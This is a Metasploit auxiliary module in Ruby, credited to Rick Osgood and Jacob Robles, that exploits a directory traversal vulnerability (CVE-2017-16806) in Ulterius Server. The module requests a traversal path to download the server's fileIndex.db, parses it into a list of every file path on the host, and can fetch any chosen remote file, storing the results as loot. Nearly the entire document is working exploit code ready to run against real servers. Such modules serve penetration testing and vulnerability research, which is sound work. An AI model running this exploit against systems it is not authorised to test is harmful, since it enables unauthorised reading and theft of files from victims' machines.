##
# This module requires Metasploit: https://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

class MetasploitModule < Msf::Auxiliary
  include Msf::Exploit::Remote::HttpClient

  def initialize(info = {})
    super(update_info(info,
      'Name'           => 'Ulterius Server File Download Vulnerability',
      'Description'    => %q{
        This module exploits a directory traversal vulnerability in Ulterius Server < v1.9.5.0
        to download files from the affected host. A valid file path is needed to download a file.
        Fortunately, Ulterius indexes every file on the system, which can be stored in the
        following location:

          http://ulteriusURL:port/.../fileIndex.db.

        This module can download and parse the fileIndex.db file. There is also an option to
        download a file using a provided path.
      },
      'Author'         =>
        [
          'Rick Osgood',   # Vulnerability discovery and PoC
          'Jacob Robles'   # Metasploit module
        ],
      'License'        => MSF_LICENSE,
      'References'     =>
        [
          [ 'EDB', '43141' ],
          [ 'CVE', '2017-16806' ]
        ]))

      register_options(
        [
          Opt::RPORT(22006),
          OptString.new('PATH', [true, 'Path to the file to download', '/.../fileIndex.db']),
        ])
  end

  def process_data(index, parse_data)
    length = parse_data[index].unpack('C')[0]
    length += parse_data[index+1].unpack('C')[0]
    length += parse_data[index+2].unpack('C')[0]
    length += parse_data[index+3].unpack('C')[0]

    index += 4
    filename = parse_data[index...index+length]
    index += length
    return index, filename
  end

  def inflate_parse(data)
    zi = Zlib::Inflate.new(window_bits =-15)
    data_inflated = zi.inflate(data)

    parse_data = data_inflated[8...-1]
    remote_files = ""

    index = 0
    print_status('Starting to parse fileIndex.db...')
    while index < parse_data.length
      index, filename = process_data(index, parse_data)
      index, directory = process_data(index, parse_data)
      remote_files << directory + '\\' + filename + "\n"

      #skip FFFFFFFFFFFFFFFF
      index += 8
    end
    myloot = store_loot('ulterius.fileIndex.db', 'text/plain', datastore['RHOST'], remote_files, 'fileIndex.db', 'Remote file system')
    print_status("Remote file paths saved in: #{myloot.to_s}")
  end

  def run
    path = datastore['PATH']
    # Always make sure there is a starting slash so as an user,
    # we don't need to worry about it.
    path = "/#{path}" if path && path[0] != '/'

    print_status("Requesting: #{path}")

    begin
      res = send_request_cgi({
        'uri' => normalize_uri(path),
        'method' => 'GET'
      })
    rescue Rex::ConnectionRefused, Rex::ConnectionTimeout,
           Rex::HostUnreachable, Errno::ECONNRESET => e
      vprint_error("Failed: #{e.class} - #{e.message}")
      return
    end

    if res && res.code == 200
      if path =~ /fileIndex\.db/i
        inflate_parse(res.body)
      else
        myloot = store_loot('ulterius.file.download', 'text/plain', datastore['RHOST'], res.body, path, 'Remote file system')
        print_status("File contents saved: #{myloot.to_s}")
      end
    end
  end

end
